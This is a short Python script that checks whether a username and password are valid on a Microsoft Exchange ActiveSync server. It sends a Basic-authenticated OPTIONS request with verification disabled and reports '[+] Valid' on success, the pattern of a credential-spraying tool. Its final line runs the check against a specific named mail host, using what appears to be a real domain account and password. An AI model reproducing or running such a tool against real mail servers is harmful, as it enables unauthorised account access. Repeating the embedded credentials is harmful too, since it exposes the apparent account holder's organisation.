import requests
import base64
import sys
import warnings
warnings.filterwarnings("ignore")

def EAS(ip,username,password):
    try:
        credential = base64.b64encode(username+":"+password)
        url = 'https://' + ip + '/Microsoft-Server-ActiveSync'
        headers = {
            'User-Agent': 'ExchangeServicesClient/0.0.0.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/vnd.ms-sync.wbxml',
            'Authorization': 'Basic '+credential
        } 
        
        r = requests.options(url, headers = headers, verify = False)
    
        if r.status_code ==200: 
            print('[+] Valid: %s  %s'%(username,password))
            #print(r.headers)
        else:         
            print('[!] Authentication failed')
    except Exception as e:
            print('[!]Error:%s'%e)

        
EAS("mail2.cdspl.com","cdspl.com\\yogesh","Yogesh@123")
